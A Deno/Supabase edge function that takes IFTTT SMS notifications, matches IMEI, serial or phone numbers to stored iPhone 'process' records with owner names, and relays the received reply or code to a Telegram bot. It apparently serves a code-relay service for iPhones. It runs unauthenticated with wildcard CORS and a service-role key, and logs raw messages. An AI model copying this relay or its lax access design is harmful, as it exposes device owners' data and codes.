
import { serve } from "https://deno.land/std@0.168.0/http/server.ts"

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
}

interface NotificationData {
  // Formato que viene de IFTTT
  NotificationTitle?: string;
  NotificationMessage?: string;
  
  // Formato alternativo para pruebas manuales
  message?: string;
  sender?: string;
  response?: string;
}

serve(async (req) => {
  console.log(`[${new Date().toISOString()}] Received ${req.method} request to telegram-notification`);
  
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    console.log('Handling CORS preflight request');
    return new Response(null, { headers: corsHeaders });
  }

  try {
    console.log('Processing notification request...');
    
    let requestData: NotificationData;
    
    try {
      const body = await req.text();
      console.log('Raw request body:', body);
      
      if (!body || body.trim() === '') {
        console.log('Empty request body, using default test data');
        requestData = {
          NotificationTitle: 'Prueba',
          NotificationMessage: 'Este es un mensaje de prueba desde IFTTT'
        };
      } else {
        requestData = JSON.parse(body);
      }
    } catch (parseError) {
      console.error('Error parsing request body:', parseError);
      return new Response(
        JSON.stringify({ 
          success: false, 
          error: 'Invalid JSON format',
          message: 'El cuerpo de la solicitud no es un JSON válido'
        }), 
        { 
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 400
        }
      );
    }
    
    console.log('Parsed notification data:', requestData);

    // Determinar el mensaje y extraer información
    let fullMessage = '';
    let sender = 'IFTTT';
    let response = '';
    
    if (requestData.NotificationTitle || requestData.NotificationMessage) {
      // Formato de IFTTT
      fullMessage = `${requestData.NotificationTitle || ''}\n${requestData.NotificationMessage || ''}`.trim();
      sender = 'IFTTT SMS';
      response = requestData.NotificationMessage || '';
    } else if (requestData.message) {
      // Formato manual/alternativo
      fullMessage = requestData.message;
      sender = requestData.sender || 'Manual';
      response = requestData.response || '';
    } else {
      console.log('No message content found, using default');
      fullMessage = 'Mensaje de prueba';
      sender = 'Sistema';
      response = 'Prueba';
    }

    console.log('Processing message:', { 
      fullMessage: fullMessage.substring(0, 100) + '...', 
      sender, 
      response: response.substring(0, 100) + '...' 
    });

    // Extract potential identifiers from the message
    const imeiMatch = fullMessage.match(/IMEI[:\s]*([0-9]{15})/i);
    const serialMatch = fullMessage.match(/Serie[:\s]*([A-Z0-9]+)/i) || fullMessage.match(/Serial[:\s]*([A-Z0-9]+)/i);
    const phoneMatch = fullMessage.match(/(\+\d{1,3}\s?\d{3}\s?\d{3}\s?\d{4})/);
    
    const imei = imeiMatch ? imeiMatch[1] : null;
    const serialNumber = serialMatch ? serialMatch[1] : null;
    const phoneNumber = phoneMatch ? phoneMatch[1].replace(/\s/g, '') : null;

    console.log('Extracted identifiers:', { imei, serialNumber, phoneNumber });

    // Para pruebas, si no hay identificadores, usar datos de prueba
    if (!imei && !serialNumber && !phoneNumber) {
      console.log('No identifiers found, will try to find any process for testing');
      
      // Create Supabase client
      const supabaseUrl = Deno.env.get('SUPABASE_URL')!;
      const supabaseKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
      
      console.log('Connecting to Supabase...');
      const { createClient } = await import('https://esm.sh/@supabase/supabase-js@2');
      const supabase = createClient(supabaseUrl, supabaseKey);

      // Para pruebas, buscar cualquier proceso que tenga bot configurado
      const { data: processes, error: queryError } = await supabase
        .from('processes')
        .select(`
          id,
          user_id,
          client_name,
          iphone_model,
          imei,
          serial_number,
          owner_name,
          profiles!inner(telegram_bot_token, telegram_chat_id)
        `)
        .not('profiles.telegram_bot_token', 'is', null)
        .not('profiles.telegram_chat_id', 'is', null)
        .limit(1);

      if (queryError) {
        console.error('Database query error:', queryError);
        return new Response(
          JSON.stringify({ 
            success: false, 
            error: 'Database error',
            details: queryError.message 
          }), 
          { 
            headers: { ...corsHeaders, 'Content-Type': 'application/json' },
            status: 500
          }
        );
      }

      if (!processes || processes.length === 0) {
        console.log('No processes with Telegram configured found');
        return new Response(
          JSON.stringify({ 
            success: false, 
            error: 'No processes found',
            message: 'No se encontraron procesos con Telegram configurado para hacer la prueba'
          }), 
          { 
            headers: { ...corsHeaders, 'Content-Type': 'application/json' },
            status: 404
          }
        );
      }

      const process = processes[0];
      const profile = process.profiles;

      console.log('Found test process:', process.id, 'for user:', process.user_id);

      // Format the notification message
      const notificationMessage = `🔔 Alerta de proceso de WhatsApp (PRUEBA)

👩🏽‍💻 Servidor Astro

📊 INFORMACIÓN DEL PROCESO:
👤 Cliente: ${process.client_name || 'Cliente de prueba'}
📱 Modelo: ${process.iphone_model || 'iPhone de prueba'}
📞 IMEI: ${process.imei || 'IMEI de prueba'}
🔢 Serie: ${process.serial_number || 'Serie de prueba'}
${process.owner_name ? `👥 Propietario: ${process.owner_name}` : ''}

📞 Remitente: ${sender}
📥 Mensaje recibido: ${fullMessage}
📥 Respuesta o código: ${response}

🤖 Bot Astro en línea 🟢

⚠️ Este es un mensaje de PRUEBA`;

      console.log('Sending test notification to Telegram...');
      
      // Send notification to user's Telegram bot
      const telegramUrl = `https://api.telegram.org/bot${profile.telegram_bot_token}/sendMessage`;
      
      const telegramResponse = await fetch(telegramUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: profile.telegram_chat_id,
          text: notificationMessage,
          parse_mode: 'HTML'
        }),
      });

      const telegramResult = await telegramResponse.json();
      
      if (!telegramResponse.ok) {
        console.error('Telegram API error:', telegramResult);
        return new Response(
          JSON.stringify({ 
            success: false, 
            error: 'Failed to send Telegram message',
            details: telegramResult
          }), 
          { 
            headers: { ...corsHeaders, 'Content-Type': 'application/json' },
            status: 500
          }
        );
      }

      console.log('Test notification sent successfully to user:', process.user_id);

      return new Response(
        JSON.stringify({ 
          success: true, 
          message: 'Test notification sent successfully',
          process_id: process.id,
          user_id: process.user_id,
          identifiers_found: false,
          test_mode: true
        }), 
        { 
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 200
        }
      );
    }

    // Si hay identificadores, continuar con el flujo normal
    const supabaseUrl = Deno.env.get('SUPABASE_URL')!;
    const supabaseKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
    
    console.log('Connecting to Supabase...');
    const { createClient } = await import('https://esm.sh/@supabase/supabase-js@2');
    const supabase = createClient(supabaseUrl, supabaseKey);

    // Find the process owner by matching identifiers
    console.log('Searching for matching process...');
    let query = supabase
      .from('processes')
      .select(`
        id,
        user_id,
        client_name,
        iphone_model,
        imei,
        serial_number,
        owner_name,
        profiles!inner(telegram_bot_token, telegram_chat_id)
      `);

    // Build the query based on available identifiers
    if (imei) {
      query = query.eq('imei', imei);
    } else if (serialNumber) {
      query = query.eq('serial_number', serialNumber);
    } else if (phoneNumber) {
      query = query.eq('phone_number', phoneNumber);
    }

    const { data: processes, error: queryError } = await query;

    if (queryError) {
      console.error('Database query error:', queryError);
      return new Response(
        JSON.stringify({ 
          success: false, 
          error: 'Database error',
          details: queryError.message 
        }), 
        { 
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 500
        }
      );
    }

    console.log(`Found ${processes?.length || 0} matching processes`);

    if (!processes || processes.length === 0) {
      console.log('No matching process found');
      return new Response(
        JSON.stringify({ 
          success: false, 
          error: 'Process not found',
          message: 'No se encontró un proceso que coincida con los identificadores del mensaje'
        }), 
        { 
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 404
        }
      );
    }

    const process = processes[0];
    const profile = process.profiles;

    console.log('Found process:', process.id, 'for user:', process.user_id);

    if (!profile.telegram_bot_token || !profile.telegram_chat_id) {
      console.log('User has not configured Telegram bot');
      return new Response(
        JSON.stringify({ 
          success: false, 
          error: 'Telegram not configured',
          message: 'El usuario no ha configurado su bot de Telegram'
        }), 
        { 
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 400
        }
      );
    }

    // Format the notification message
    const notificationMessage = `🔔 Alerta de proceso de WhatsApp

👩🏽‍💻 Servidor Astro

📊 INFORMACIÓN DEL PROCESO:
👤 Cliente: ${process.client_name}
📱 Modelo: ${process.iphone_model}
📞 IMEI: ${process.imei}
🔢 Serie: ${process.serial_number}
${process.owner_name ? `👥 Propietario: ${process.owner_name}` : ''}

📞 Remitente: ${sender}
📥 Respuesta o código: ${response}

🤖 Bot Astro en línea 🟢`;

    console.log('Sending notification to Telegram...');
    
    // Send notification to user's Telegram bot
    const telegramUrl = `https://api.telegram.org/bot${profile.telegram_bot_token}/sendMessage`;
    
    const telegramResponse = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: profile.telegram_chat_id,
        text: notificationMessage,
        parse_mode: 'HTML'
      }),
    });

    const telegramResult = await telegramResponse.json();
    
    if (!telegramResponse.ok) {
      console.error('Telegram API error:', telegramResult);
      return new Response(
        JSON.stringify({ 
          success: false, 
          error: 'Failed to send Telegram message',
          details: telegramResult
        }), 
        { 
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 500
        }
      );
    }

    console.log('Notification sent successfully to user:', process.user_id);

    return new Response(
      JSON.stringify({ 
        success: true, 
        message: 'Notification sent successfully',
        process_id: process.id,
        user_id: process.user_id,
        identifiers_found: true
      }), 
      { 
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        status: 200
      }
    );

  } catch (error) {
    console.error('Error processing notification:', error);
    return new Response(
      JSON.stringify({ 
        success: false, 
        error: 'Internal server error',
        details: error.message
      }), 
      { 
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        status: 500
      }
    );
  }
});
